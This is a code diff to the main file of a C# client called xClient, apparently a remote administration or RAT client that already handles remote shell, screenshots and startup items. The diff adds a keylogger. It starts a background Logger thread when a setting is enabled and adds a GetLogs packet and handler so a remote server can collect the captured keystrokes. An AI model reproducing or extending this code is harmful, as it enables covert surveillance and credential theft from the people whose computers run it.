@@ -5,6 +5,7 @@ using System.Windows.Forms;
 using xClient.Config;
 using xClient.Core;
 using xClient.Core.Commands;
+using xClient.Core.Keylogger;
 using xClient.Core.Packets;
 
 namespace xClient
@@ -35,6 +36,8 @@ namespace xClient
             CommandHandler.CloseShell();
             if (CommandHandler.LastDesktopScreenshot != null)
                 CommandHandler.LastDesktopScreenshot.Dispose();
+            if (Logger.Instance != null)
+                Logger.Instance.Enabled = false;
             if (_appMutex != null)
                 _appMutex.Close();
 
@@ -73,6 +76,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.GetStartupItems),
                 typeof (Core.Packets.ServerPackets.AddStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
+                typeof (Core.Packets.ServerPackets.GetLogs),
                 typeof (Core.Packets.ClientPackets.Initialize),
                 typeof (Core.Packets.ClientPackets.Status),
                 typeof (Core.Packets.ClientPackets.UserStatus),
@@ -84,7 +88,8 @@ namespace xClient
                 typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
                 typeof (Core.Packets.ClientPackets.MonitorsResponse),
                 typeof (Core.Packets.ClientPackets.ShellCommandResponse),
-                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse)
+                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
+                typeof (Core.Packets.ClientPackets.GetLogsResponse)
             });
 
             ConnectClient.ClientState += ClientState;
@@ -121,6 +126,14 @@ namespace xClient
                 new Thread(SystemCore.UserIdleThread).Start();
 
                 InitializeClient();
+
+                if (Settings.ENABLELOGGER)
+                {
+                    new Thread(() =>
+                    {
+                        Logger logger = new Logger(30000) { Enabled = true };
+                    }).Start();
+                }
             }
             else
             {
@@ -291,6 +304,10 @@ namespace xClient
             {
                 CommandHandler.HandleDownloadFileCanceled((Core.Packets.ServerPackets.DownloadFileCanceled) packet,
                     client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.GetLogs))
+            {
+                CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs) packet, client);
             }
         }
     }
